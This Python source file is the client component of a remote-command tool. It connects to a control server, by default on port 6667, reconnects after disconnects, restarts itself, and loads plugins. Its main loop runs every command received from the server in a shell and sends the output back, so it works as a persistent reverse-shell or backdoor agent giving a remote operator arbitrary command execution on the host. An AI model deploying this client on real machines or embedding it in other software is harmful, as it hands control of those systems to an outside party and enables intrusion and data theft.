from __future__ import print_function
import sys
import os
import socket
import subprocess
from os.path import realpath
from time import sleep
from common import PluginRunner
from common import LoopReturnEvent
from common import LoopContinueEvent
from common import LoopBreakEvent
from connection import TerminatingClient, HeaderClient


def get_arg_dict(args):
    """
    Get a dictionary of keyword arguments.

    :param args:
    :return:
    """

    output = {
        'host': '',
        'port': 6667,
        'recv_size': 1024,
        'session_id': '',
        'echo': True,
    }
    for arg in args:
        if 'host=' in arg:
            output['host'] = arg.split('=')[1]
        elif 'port=' in arg:
            output['port'] = int(arg.split('=')[1])
        elif 'recv_size=' in arg:
            output['recv_size'] = int(arg.split('=')[1])
        elif 'session_id=' in arg:
            output['session_id'] = arg.split('=')[1].strip()
        elif 'echo=' in arg:
            output['echo'] = False if arg.split('=')[1].strip().upper() == 'N' else True
    return output


class Client(PluginRunner):
    """
    The Client object is in charge of staying connected to the Server and forwarding
    server commands to the OS, or to Client plugins.
    """

    def __init__(self, connection_type, host='', port=6667, recv_size=1024, session_id='', echo=True):
        self.host = host
        self.port = port
        self.recv_size = recv_size
        self.session_id = session_id
        self.echo = echo
        self.ip_address = '0.0.0.0'
        self.connected_port = '00000'
        self.reconnect_to_session = True
        self.__file__ = __file__
        self.connection_type = connection_type
        self.sock = connection_type(
            host=host,
            port=port,
            recv_size=recv_size,
            session_id=session_id,
            echo=echo
        )

    def send_data(self, some_data, echo=True, encode=True, chunks=False):
        return self.sock.send_data(some_data, echo=echo, encode=encode, chunks=chunks)

    def handle_disconnect(self):
        """
        Handle a disconnect event.

        :return:
        """

        if self.echo:
            print('< Disconnecting. >')
        # Handle a disconnect command.
        self.send_data('confirmed')
        self.sock.sock.close()
        sleep(1)
        self.sock.connect_to_server()
        return self

    def get_client_plugins(self):
        """
        Dynamically import any client_plugins in the `client_plugins` package.

        :return:
        """

        plugin_list = []
        # todo: Make this windows compatible.
        fp = __file__.replace(__file__.split('/')[-1], '') + 'client_plugins'
        module_names = [n.replace('.py', '').replace('.pyc', '') for n in os.listdir(fp) if '__init__.py' not in n]
        hidden_files = [n for n in os.listdir(fp) if n[0] == '.']
        module_names = [n for n in module_names if n not in hidden_files]

        try:
            module_names.remove('__pycache__')
        except ValueError:
            pass

        for module_name in module_names:
            module = __import__('client_plugins.' + module_name, fromlist=[''])
            plugin_list.append(module)

        return plugin_list

    def terminate(self):
        """
        Send some ending data if the server expects a response but there isn't really any data to send.

        :return:
        """

        self.sock.terminate()

    def server_print(self, some_data, echo=True, encode=True, chunks=False):
        """
        A shortcut method to facilitate sending data to the server without worrying about
        whether or not there is a newline character at the end.

        :param some_data:
        :param echo:
        :param encode:
        :param chunks:
        :return:
        """

        some_data = some_data + '\n' if some_data[-1] != '\n' else some_data
        self.send_data(some_data, echo=echo, encode=encode, chunks=chunks)
        return

    def reboot_self(self):
        """
        Reboot this script.

        :return:
        """

        if self.echo:
            print('< Rebooting self. >')
        try:
            self.sock.sock.close()
        except socket.error:
            pass
        rc = [
            sys.executable,
            'port={}'.format(self.port),
            'host={}'.format(self.host),
            'recv_size={}'.format(self.recv_size),
            'session_id={}'.format(self.session_id),
            'echo={}'.format(self.echo)
        ]

        try:
            popen_rc = [sys.executable] + list((sys.argv[0],)) + rc[1:]
            p = subprocess.Popen(popen_rc)
            p.communicate()
            sys.exit()
        except PermissionError:
            from os import execv
            if self.echo:
                print('< Using execv. >')
            rc.pop(0)
            rc.insert(0, realpath(__file__))
            rc.insert(0, '')
            execv(sys.executable, rc)

        sys.exit()

    def main(self):
        """
        Start receiving commands.

        :return:
        """

        plugin_list = self.get_client_plugins()
        if self.echo:
            print('< Loaded {} plugins. >'.format(len(plugin_list)))

        # If we have a socket, then proceed to receive commands.
        if self.sock:
            # upload_filepath = False
            while True:
                data = self.sock.receive_data()

                if not data:
                    self.send_data('')
                    continue

                if type(data) == list:
                    dl = list(data)
                else:
                    dl = [data]

                broke = False
                continued = False
                returned = False
                for data in dl:
                    broke = False
                    continued = False
                    returned = False

                    try:
                        data = data.decode('utf-8')
                    except AttributeError:
                        pass

                    if self.echo:
                        print('data: {}'.format(data))
                    # # # # # # # PROCESS PLUGINS # # # # # # #
                    if not data[0] == '\\':
                        plugin_ran, obj = self.process_plugins(plugin_list, data)
                        if plugin_ran:
                            # Check for events!
                            if isinstance(obj, LoopBreakEvent):
                                broke = True
                                break
                            if isinstance(obj, LoopContinueEvent):
                                continued = True
                                break
                            if isinstance(obj, LoopReturnEvent):
                                returned = True, obj.value
                                break
                            continued = True
                if broke:
                    break
                if continued:
                    continue
                if returned:
                    return returned[1]

                # Process the command.
                try:
                    cmd = subprocess.Popen(
                        data[:],
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        timeout=600
                    )
                except TypeError:
                    cmd = subprocess.Popen(
                        data[:],
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE
                    )

                # Compile the output.
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                try:
                    output_str = str(output_bytes, 'utf-8')
                except TypeError:
                    output_str = str(output_bytes.decode('utf-8'))
                # if self.echo:
                print('Output Str: {}'.format(output_str))
                # Send the output back to control server.

                self.send_data(output_str)


if __name__ == '__main__':
    def main():
        default_host = ''
        default_port = 6667
        default_recv_size = 1024
        default_session_id = ''
        default_echo = True

        args = sys.argv[1:]
        if not args:
            args = [
                'host={}'.format(default_host),
                'port={}'.format(default_port),
                'recv_size={}'.format(default_recv_size),
                'session_id={}'.format(default_session_id),
                'echo={}'.format(default_echo)
            ]
        arg_dict = get_arg_dict(args)

        # Instantiate the client.
        client = Client(
            HeaderClient,
            host=arg_dict['host'],
            port=arg_dict['port'],
            recv_size=arg_dict['recv_size'],
            session_id=arg_dict['session_id'],
            echo=arg_dict['echo']
        )

        client.main()
        client.reboot_self()
        sys.exit()

    main()

